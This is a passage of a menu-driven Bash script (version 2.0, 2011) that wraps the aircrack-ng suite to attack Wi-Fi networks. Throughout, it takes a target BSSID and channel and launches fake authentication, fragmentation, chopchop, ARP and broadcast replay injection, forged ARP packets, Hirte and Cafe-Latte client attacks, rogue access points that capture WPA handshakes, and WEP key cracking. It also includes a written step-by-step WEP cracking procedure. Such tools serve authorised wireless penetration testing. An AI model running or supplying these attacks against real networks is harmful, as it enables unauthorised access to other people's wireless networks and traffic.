			1|2|3|4|5|6|7|8|9|10|11) ;;
			*) sc= ## Nulled
		esac

	done

	while [ -z $rb ];do
		echo -e "\033[36m\nRouter BSSID?"
		read rb
	done

	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng $pii --channel $sc --bssid $rb & wifi_dea_pid=$!
	sleep .7
	wifi_deauth_II--
	clear
	}

	auth--()
	{
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                          --Fake Authentication Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Tgt Channel                                            [\033[1;33m$tc\033[36m]

2) BSSID                                                  [\033[1;33m$b\033[36m]

3) Source MAC                                             [\033[1;33m$sm\033[36m]

4) Re-Authentication Packets per Burst {1 is Recommended} [\033[1;33m$ppb\033[36m]

5) Re-Authentication Delay in Seconds {10 is Recommended} [\033[1;33m$rd\033[36m]

6) Keep-Alive Frequency in Seconds {3 is Recommended}     [\033[1;33m$kaf\033[36m]

7) ESSID {Optional, Must be Used if ESSID is Hidden}      [\033[1;33m$hid_essid\033[36m]

8) SKA .xor Injection {Optional}                          [\033[1;33m$ska_xor\033[36m]

9) Proceed

P)revious Menu 

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) tchan--
		iwconfig $pii channel $tc
		auth--;;

		2) echo -e "\033[36m\nTgt BSSID?"
		read b
		auth--;;

		3) echo -e "\033[36m\nSource MAC?"
		read sm
		auth--;;

		4) ppb= ## Nulled
		while [ -z $ppb ];do
			echo -e "\033[36m\nRe-Authentication Packets per Burst? (1=Single 0=Multiple)"
			read ppb
			case $ppb in
				1|0) ;;
				*) ppb= ;; ## Nulled
			esac
		done

		auth--;;

		5) echo -e "\033[36m\nRe-Authentication Delay in Seconds?"
		read rd
		auth--;;

		6) echo -e "\033[36m\nKeep-Alive Frequency in Seconds?"
		read kaf
		auth--;;

		7) echo -e "\033[36m\nEnter Hidden ESSID (Leave Blank to Null)"
		read hid_essid
		auth--;;

		8) echo -e "\033[36m\n.xor file? (Leave Blank to Null)"
		read ska_xor
		auth--;;

		9) if [[ -z $tc || -z $b || -z $sm || -z $ppb || -z $rd || -z $kaf ]];then
			echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			auth--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) auth--;;
	esac

	if [[ -z $hid_essid && -z $ska_xor ]];then
		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm &
	elif [[ -z $ska_xor ]];then
		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth Hidden ESSID" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" &
	elif [[ -z $hid_essid ]];then
		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor &
	else
		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth Hidden ESSID w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor -e "$hid_essid" &
	fi

	venue--
	}

	rtech--()
	{
	#rt= ## Router Technique
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~
Router Technique Selection
~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Fragmentation Attack

2) Chop Attack

3) ARP Replay Attack

4) Broadcast Attack

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read rt
	case $rt in
		1|2|3|4) rppb=500 ## Replayed packets per burst
		case $rt in
			1|2) parent_II="fragchop";;
			3|4) parent_II="broadarp";;
		esac

		e= ## Nulled
		rtech_II--;;

		p|P) venue--;;

		m|M) main_menu--;;
		
		*) rtech--;;
	esac
	}

	pforge--()
	{
	nowdate=`date +%M%S` ## Timestamp for files
	pf_var= ## variable name for -w filename

		pforge_S--()
		{
		clear
		echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --Simple Packet Forging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Tgt BSSID      [\033[1;33m$b\033[36m]

2) Source MAC     [\033[1;33m$sm\033[36m]

3) .xor filename  [\033[1;33m$xor\033[36m]

4) Proceed

P)revious Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
		read var
		case $var in
			1) echo -e "\033[36m\nTgt BSSID?"
			read b
			pforge_S--;;

			2) echo -e "\033[36m\nSource MAC?"
			read sm
			pforge_S--;;

			3) echo -e "\033[36m\n.xor filename?"
			read xor
			pforge_S--;;

			4) if [[ -z $b || -z $sm || -z $xor ]];then
				echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
				sleep 1
				pforge_S--
			fi;;

			p|P) pforge--;;

			*) pforge_S--;;
		esac
		}

		pforge_A--()
		{
		clear
		echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     --Advanced Packet Forging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Tgt BSSID      [\033[1;33m$b\033[36m]

2) Source MAC     [\033[1;33m$sm\033[36m]

3) .xor filename  [\033[1;33m$xor\033[36m]

4) Source IP      [\033[1;33m$src_ip\033[36m]

5) Destination IP [\033[1;33m$dst_ip\033[36m]

6) Proceed

P)revious Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
		read var
		case $var in
			1) echo -e "\033[36m\nTgt BSSID?"
			read b
			pforge_A--;;

			2) echo -e "\033[36m\nSource MAC?"
			read sm
			pforge_A--;;

			3) echo -e "\033[36m\n.xor filename?"
			read xor
			pforge_A--;;

			4) echo -e "\033[36m\nSource IP?"
			read src_ip
			pforge_A--;;

			5)echo -e "\033[36m\nDestination IP?"
			read dst_ip
			pforge_A--;;

			6) if [[ -z $xor || -z $src_ip || -z $dst_ip ]];then
				echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
				sleep 1
				pforge_A--
			fi;;

			p|P) pforge--;;

			*) pforge_A--;;
		esac
		}

	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   --Packet Forging Mode--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Simple Mode {Recommended}

2) Advanced Mode

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) p_mode="simple" ;;
		2) p_mode="advanced" ;;
		p|P) p_mode="venue" ;;
		m|M) p_mode="main" ;;
	esac

	case $p_mode in
		simple) pforge_S--;;
		advanced) pforge_A--;;
	esac

	echo -e "\033[1;33m"
	case $p_mode in
		simple) packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w $nowdate\arp-request ;;
		advanced) packetforge-ng -0 -a $b -h $sm -k $dst_ip -l $src_ip -y $xor -w arp-request ;;
	esac

	case $p_mode in
		simple|advanced) while [ -z $pf_var ];do
			echo -e "\033[36m\nWhat was the name of the file just created?"
			read pf_var
		done

		venue--;;

		venue) venue--;;

		main) main_menu--;;
	esac
	}

	forge_out--()
	{
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --Forged Packet Injection Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Replayed Packets per Burst [\033[1;33m$rppb\033[36m]

2) Packetforge-NG Filename    [\033[1;33m$pf_var\033[36m]

3) Source MAC                 [\033[1;33m$sm\033[36m]

4) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36m\nReplayed Packets per Burst?"
		read rppb
		if [ $rppb -gt 1000 ];then
			rppb=1000
		elif [ $rppb -lt 1 ];then
			rppb=1
		fi
		forge_out--;;

		2) echo -e "\033[36m\nPacketforce-NG Filename?"
		read pf_var
		forge_out--;;

		3) echo -e "\033[36mSource MAC?"
		read sm
		forge_out--;;

		4) if [[ -z $rppb || -z $pf_var || -z $sm ]];then
			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
			sleep 1
			forge_out--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) forge_out--;;
	esac


	xterm -bg black -fg grey -sb -rightbar -title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
	venue--
	}

	ctech--()
	{
	#ct= ## Client technique
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~
Client Technique Selection
~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Hirte (AP)

2) Hirte (Ad-Hoc)

3) Cafe-Latte

4) Shared-Key PRGA Capture

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read ct
	case $ct in
		1|2|3|4) ctech_II--;;
		p|P) venue--;;
		m|M) main_menu--;;
		*) ctech--;;
	esac
	}

	crack--()
	{
	clear
	parent_V= ## Nulled to prevent repeat looping that is NOT wanted!
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --WEP Crack Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Tgt BSSID   [\033[1;33m$b\033[36m]

2) File Name   [\033[1;33m$cf\033[36m]

3) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36mTgt BSSID?"
		read b
		crack--;;

		2) parent_V="crack"
		cfile--;;

		3) if [[ -z $b || -z $cf ]];then
			echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			crack--
		else
			xterm -bg black -fg grey -sb -rightbar -hold -title "WEP Crackin BSSID: $b File: $cf" -e aircrack-ng -a 1 -b $b $cf* &
			crack--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) crack--;;
	esac
	}

	WPA--()
	{
	#wifu= ## WPA Client Attack Method
	e= ## Desired ESSID
	#enc_type= ## Encryption Type
	#spec= ## Variable for WPA_II()
	all_probe= ## Respond to all probes
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          --WPA Client Attack Techniques--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) WPA (Specified ESSID)

2) WPA2 (Specified ESSID)

3) All Tags (Specified ESSID)

4) WPA (Responding to All Broadcast Probes)

5) WPA2 (Responding to All Broadcast Probes)

6) All Tags (Responding to All Broadcast Probes)

7) d'Otreppe WPA (Specified ESSID)

8) d'Otreppe WPA2 (Specified ESSID)

9) d'Otreppe All Tags (Specified ESSID)

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read wifu
	case $wifu in
		1|4|7) enc_type='-z 2';;
		2|5|8) enc_type='-Z 4';;
		3|6|9) enc_type='-0';;
		p|P) venue--;;
		m|M) main_menu--;;
		*) WPA--;;
	esac

	case $wifu in
		1|2|3|7|8|9) spec="1"
		while [ -z $e ];do
			echo -e "\033[36m\nDefine ESSID"
			read e
		done;;

		4|5|6) spec=2
		all_probe='-P -C 60';;
	esac

	tchan--
	iwconfig $pii channel $tc
	}

	lists--()
	{
	clear
	echo -e "\033[1;32m
1 - Start the wireless interface in monitor mode on the specific AP channel

2 - Use aireplay-ng to do a fake authentication with the access point
    If this fails due to use of SKA, do:
        A) Start the wireless interface in monitor mode on the specific AP channel
        B) Start airodump-ng on AP channel with filter for bssid to collect the PRGA xor file
        C) Deauthenticate a connected client
        D) Perform shared key fake authentication

3 - If using standard ARP replays or Broadcast attacks, then:
        A) Run aircrack-ng to crack key using the IVs collected

    elif using fragmentation attack or chopchop, then:
        A) Use aireplay-ng chopchop or fragmentation attack to obtain PRGA .xor file
        B) Use packetforge-ng to create an arp packet using the .xor obtain in the previous step
        C) Start airodump-ng on AP channel with filter for bssid to collect the new unique IVs
        D) Inject the arp packet created in step B
        E) Run aircrack-ng to crack key using the IVs collected"
	read
	venue--
	}
##~~~~~~~~~~~~~~~~~~~~ END wifi_101-- venue-- functions ~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~ BEGIN wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
	rtech_II--()
	{
	clear
	case $parent_II in
		fragchop) echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --Attack Generation Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Tgt Channel      [\033[1;33m$tc\033[36m]

2) Source MAC       [\033[1;33m$sm\033[36m]

3) Tgt BSSID        [\033[1;33m$b\033[36m]

4) ESSID {Optional} [\033[1;33m$e\033[36m]

5) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
		read var
		case $var in
			1) parent_III="rtech" 
			tchan--
			iwconfig $pii channel $tc ;;

			2) echo -e "\033[36m\nSource MAC?"
			read sm
			rtech_II--;;

			3) echo -e "\033[36m\nTgt BSSID?"
			read b
			rtech_II--;;

			4) echo -e "\033[36m\nTgt ESSID? (Leave Blank to Null)"
			read e
			rtech_II--;;

			5) if [[ -z $tc || -z $sm || -z $b ]];then
				echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				rtech_II--
			fi;;

			p|P) rtech--;;

			m|M) main_menu--;;

			*) rtech_II--;;
		esac;;

		broadarp) echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     --Attack Generation Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Replayed Packets per Burst {500 is Recommended} [\033[1;33m$rppb\033[36m]

2) Tgt Channel                                     [\033[1;33m$tc\033[36m]

3) Source MAC                                      [\033[1;33m$sm\033[36m]

4) Tgt BSSID                                       [\033[1;33m$b\033[36m]

5) ESSID {Optional}                                [\033[1;33m$e\033[36m]

6) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
		read var
		case $var in
			1) echo -e "\033[36m\nReplayed Packets per Burst?"
			read rppb
			if [ $rppb -gt 1000 ];then
				rppb=1000
			elif [ $rppb -lt 1 ];then
				rppb=1
			fi
			rtech_II--;;

			2) parent_III="rtech" 
			tchan--
			iwconfig $pii channel $tc;;

			3) echo -e "\033[36m\nSource MAC?"
			read sm
			rtech_II--;;

			4) echo -e "\033[36m\nTgt BSSID?"
			read b
			rtech_II--;;

			5) echo -e "\033[36m\nTgt ESSID? (Leave Blank to Null)"
			read e
			rtech_II--;;

			6) if [[ -z $rppb || -z $tc || -z $sm || -z $b ]];then
				echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				rtech_II--
			fi;;

			p|P) rtech--;;

			m|M) main_menu--;;

			*) rtech_II--;;
		esac
		parent_II= ;; ## Nulled to prevent repeat looping that is NOT wanted!
	esac

	rtech_III--
	}

	rtech_III--()
	{
	if [ $rt == "1" ];then
		st_1--
		frag_gen--
	elif [ $rt == "2" ];then
		st_1--
		chop_gen--
	elif [ $rt == "3" ];then
		st_1--
		arp_out--
	elif [ $rt == "4" ];then
		st_1--
		broad_out--
	fi

	rtech--
	}

## Frag sub-functions
	frag_gen--()
	{
	if [[ -z $e ]];then
		xterm -bg black -fg grey -sb -rightbar -hold -title "Fragmentation Attack BSSID: $b" -e aireplay-ng -5 -b $b -h $sm $pii &
	else
		xterm -bg black -fg grey -sb -rightbar -hold -title "Fragmentation Attack ESSID: $e" -e aireplay-ng -5 -b $b -e "$e" -h $sm $pii &
	fi
	}

## Chop sub-functions
	chop_gen--()
	{
	if [[ -z $e ]];then
		xterm -bg black -fg grey -sb -rightbar -hold -title "ChopChop Attack BSSID: $b" -e aireplay-ng -4 -b $b -h $sm $pii &
	else
		xterm -bg black -fg grey -sb -rightbar -hold -title "ChopChop Attack ESSID: $e" -e aireplay-ng -4 -b $b -e "$e" -h $sm $pii &
	fi
	}

## ARP sub-function
	arp_out--()
	{ xterm -bg black -fg grey -sb -rightbar -title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm & }

## Broadcast Attack sub-function
	broad_out--()
	{ xterm -bg black -fg grey -sb -rightbar -title "Broadcast Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }

##~~~~~~~~~~~~~~~~ END wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~ BEGIN wifi_101-- ctech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~##
	ctech_II--()
	{
	parent_VI= ## Nulled to prevent repeat looping that is NOT wanted!
	#e= ## tgt essid
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   --Packet Injection Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Tgt Channel  [\033[1;33m$tc\033[36m]

2) SoftAP BSSID [\033[1;33m$b\033[36m]

3) Tgt ESSID    [\033[1;33m$e\033[36m]

4) Proceed

P)revious Menu

M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) parent_VI="ctech"
		tchan--
		iwconfig $pii channel $tc ;;

		2) echo -e "\033[36m\nDesired SoftAP BSSID?"
		read b
		ctech_II--;;

		3) echo -e "\033[36m\nTgt ESSID?"
		read e
		ctech_II--;;

		4) if [[ -z $tc || -z $b || -z $e ]];then
			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
			sleep 1
			ctech_II--
		fi;;

		p|P) ctech--;;

		m|M) main_menu--;;

		*) ctech_II--;;
	esac

	st_1--
	clear
	case $ct in
		1) xterm -bg black -fg grey -sb -rightbar -title "Hirte (AP)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 &
		sleep 2;;

		2) xterm -bg black -fg grey -sb -rightbar -title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
		sleep 2;;

		3) xterm -bg black -fg grey -sb -rightbar -title "Cafe-Latte" -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
		sleep 2;;

		4) parent_VI="ctech"
		cfile--;;
	esac

	ctech--
	}
##~~~~~~~~~~~~~~~~~ END wifi_101-- ctech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- WPA-- sub-functions ~~~~~~~~~~~~~~~~~~~##
	WPA_II--()
	{
	wpa_pid= ## PID for WPA attack Airodump-NG scan
	case $spec in
		1) case $wifu in
			1|2|3) wpa_warn--
			xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -F ab_$cf & wpa_pid=$! ;;

			7|8|9) wpa_warn--
			xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -y -F ab_$cf & wpa_pid=$! ;;
		esac;;

		2) wpa_warn--
		xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
	esac

	WPA--
	}
##~~~~~~~~~~~~~~~~~~~~~ END wifi_101-- WPA-- sub-functions ~~~~~~~~~~~~~~~~~~~~##

	cleanup_101--()
	{
	main_menu--
	}

## wifi_101-- Launcher
venue--
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ END wifi_101-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
if [ "$UID" -ne 0 ];then
	echo -e "\033[31mMust be ROOT to run this script"
	exit 87
fi

if [ -z $1  ]; then
	IE= ## Internet Connected NIC
	phys_dev= ## Physical NIC variable
	pii= ## Dual mode variable, can be monitormode variable, or device to be assigned to monitor mode
	kill_mon= ## Variable to determine if the "killing a monitor mode option" has been selected
	dev_check= ## Nulled
	current_ver=2.0
	rel_date="17 December 2011"
	trap_check= ## Variable for exiting out of the Parent script if the update feature is launched
	greet--
else
	usage--
fi
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
